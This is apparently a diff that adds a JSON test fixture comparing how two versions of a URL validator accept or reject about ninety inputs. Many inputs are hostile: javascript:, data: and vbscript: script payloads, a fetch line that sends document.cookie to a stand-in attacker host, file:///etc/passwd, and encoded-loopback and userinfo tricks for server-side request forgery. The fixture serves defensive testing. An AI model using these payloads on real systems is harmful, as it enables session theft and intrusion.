@@ -1,0 +1,1342 @@
+[
+ {
+  "id": 1,
+  "input": "javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "javascript:",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 2,
+  "input": "javascript:fetch('//attacker/'+document.cookie)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "javascript: exfiltration",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 3,
+  "input": "JaVaScRiPt:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 4,
+  "input": "JavaScript:alert(1)",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "case variation",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 5,
+  "input": "JAVASCRIPT:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "case variation",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 6,
+  "input": "\tjavascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "leading control char",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 7,
+  "input": "\njavascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "leading control char",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 8,
+  "input": " javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "leading whitespace",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 9,
+  "input": "  javascript:alert(1)  ",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "surrounding whitespace",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 10,
+  "input": "java\tscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "embedded control char",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 11,
+  "input": "java\nscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded newline",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 12,
+  "input": "java\rscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded CR",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 13,
+  "input": "javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded DEL",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 14,
+  "input": "javascript://evil.com/%0aalert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "nested scheme w/ authority",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 15,
+  "input": "data:text/html,<script>alert(1)</script>",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "data:",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 16,
+  "input": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "data: base64",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 17,
+  "input": "data://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "data: with authority",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 18,
+  "input": "vbscript:msgbox(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "vbscript:",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 19,
+  "input": "blob:https://example.com/uuid",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "blob:",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 20,
+  "input": "blob:https://example.com/abc",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "blob:",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 21,
+  "input": "file:///etc/passwd",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "file:",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 22,
+  "input": "mailto:a@b.com",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "mailto:",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 23,
+  "input": "ftp://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 24,
+  "input": "ftp://example.com/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 25,
+  "input": "ws://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 26,
+  "input": "wss://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 27,
+  "input": "httpx://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "prefix-vs-membership",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 28,
+  "input": "",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "empty input",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 29,
+  "input": "   ",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "whitespace-only input",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 30,
+  "input": null,
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "null input",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 31,
+  "input": "__UNDEFINED__",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "undefined input",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 32,
+  "input": "not-a-url",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare word",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 33,
+  "input": "not a url",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "bare word with space",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 34,
+  "input": "/relative/path",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "absolute-path relative ref",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 35,
+  "input": "//evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "protocol-relative",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 36,
+  "input": "//example.com/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "protocol-relative",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 37,
+  "input": "http://",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "scheme without host",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 38,
+  "input": "https://",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "scheme without host",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 39,
+  "input": "http://[::1/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "malformed IPv6 host",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 40,
+  "input": "http://exa mple.com",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare space in host",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 41,
+  "input": "https://example.com:99999/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "out-of-range port",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 42,
+  "input": "https://github.com/o/r/pull/1",
+  "main": "A",
+  "mainValue": "https://github.com/o/r/pull/1",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed https",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 43,
+  "input": "http://example.com/x",
+  "main": "A",
+  "mainValue": "http://example.com/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed http (contested)",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 44,
+  "input": "HtTpS://example.com",
+  "main": "A",
+  "mainValue": "HtTpS://example.com",
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation, identity return",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 45,
+  "input": "https://example.com:8443/x",
+  "main": "A",
+  "mainValue": "https://example.com:8443/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed https with port",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 46,
+  "input": "https://example.com/x?a=1&b=2#frag",
+  "main": "A",
+  "mainValue": "https://example.com/x?a=1&b=2#frag",
+  "branch": null,
+  "branchValue": null,
+  "cls": "query+fragment",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 47,
+  "input": "https://user:pass@example.com/x",
+  "main": "A",
+  "mainValue": "https://user:pass@example.com/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "userinfo (RULED: reject)",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 48,
+  "input": "https://EXAMPLE.com/X",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation host/path",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 49,
+  "input": "http://例え.jp/x",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "IDN/unicode host",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 50,
+  "input": "http://[::1]/x",
+  "main": "A",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "IPv6 loopback (C1, subsumed by C2)",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 51,
+  "input": "http:/\\/\\evil.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "backslash host confusion",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 52,
+  "input": "http:/example.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "single-slash host",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 53,
+  "input": "http:example.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "opaque, no slash",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 54,
+  "input": "http://example.com/a b",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare space in path",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 55,
+  "input": "https://example.com/x\n",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "trailing newline",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 56,
+  "input": "http://example.com/%zz",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bad percent escape",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 57,
+  "input": "https:///x",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "empty host with path",
+  "branchArms": [],
+  "branchSrc": [],
+  "mainSrc": "c3e1b5c/4a54328"
+ },
+ {
+  "id": 58,
+  "input": "http://example.com/issues/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "plain http (contested)",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 59,
+  "input": "http://localhost.evil.example/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "host-prefix confusion",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 60,
+  "input": "http://evil.example/?q=localhost",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "allowlist token in query",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 61,
+  "input": "http://localhost@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo host confusion",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 62,
+  "input": "http://evil.example\\@localhost/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "backslash userinfo trick",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 63,
+  "input": "http://localhost。evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "homoglyph ideographic dot",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 64,
+  "input": "http://localhost:8080/tasks/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback (prod config)",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 65,
+  "input": "http://127.0.0.1:3000/tasks/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback (prod config)",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 66,
+  "input": "http://0x7f000001/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "hex-encoded loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 67,
+  "input": "http://2130706433/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "decimal-encoded loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 68,
+  "input": "http://127.1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "short-form loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 69,
+  "input": "http://0177.0.0.1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "octal-encoded loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 70,
+  "input": "http://127．0．0．1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "fullwidth-dot loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 71,
+  "input": "http://0x7f000001:9200/api",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "hex loopback with port",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 72,
+  "input": "https://user:pass@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo (RULED: reject)",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "9391a2a"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 73,
+  "input": "https://ok.example@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo destination confusion",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 74,
+  "input": "https://github.com@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo lookalike",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "9391a2a"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 75,
+  "input": "https://:pass@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "password-only userinfo",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "9391a2a"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 76,
+  "input": "http://user:pass@localhost/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback with credentials",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 77,
+  "input": "https://github.com/acme/repo/issues/12",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo/issues/12",
+  "cls": "allowed https",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 78,
+  "input": "HTTPS://github.com/acme/repo",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo",
+  "cls": "case variation, NORMALISED",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 79,
+  "input": "  https://github.com/acme/repo  ",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo",
+  "cls": "surrounding ws, NORMALISED",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 80,
+  "input": "https://example.com",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/",
+  "cls": "path NORMALISED",
+  "branchArms": [
+   "BLOCKING",
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "a9e49ff",
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 81,
+  "input": "https://localhost:8443/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://localhost:8443/x",
+  "cls": "https on loopback",
+  "branchArms": [
+   "BLOCKING"
+  ],
+  "branchSrc": [
+   "a9e49ff"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 82,
+  "input": "https://example.com/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/a",
+  "cls": "https accept",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 83,
+  "input": "https://github.com/acme/repo/issues/7",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo/issues/7",
+  "cls": "https accept",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 84,
+  "input": "http://localhost:3000/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "http://localhost:3000/a",
+  "cls": "loopback http (CARVEOUT arm)",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 85,
+  "input": "http://127.0.0.1:3000/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "http://127.0.0.1:3000/a",
+  "cls": "loopback http (CARVEOUT arm)",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 86,
+  "input": "http://example.com/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "remote plaintext http",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 87,
+  "input": " javascript:alert(1) ",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "whitespace-wrapped javascript:",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 88,
+  "input": "HTTPS://Example.COM/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/a",
+  "cls": "normalisation: scheme+host lowercased",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 89,
+  "input": "  https://example.com/a  ",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/a",
+  "cls": "normalisation: whitespace stripped",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 90,
+  "input": "https://example.com:443/a",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/a",
+  "cls": "normalisation: default port dropped",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ },
+ {
+  "id": 91,
+  "input": "https://example.com/a/../b",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/b",
+  "cls": "normalisation: dot segments resolved",
+  "branchArms": [
+   "CARVEOUT"
+  ],
+  "branchSrc": [
+   "ffe965d"
+  ],
+  "mainSrc": null
+ }
+]
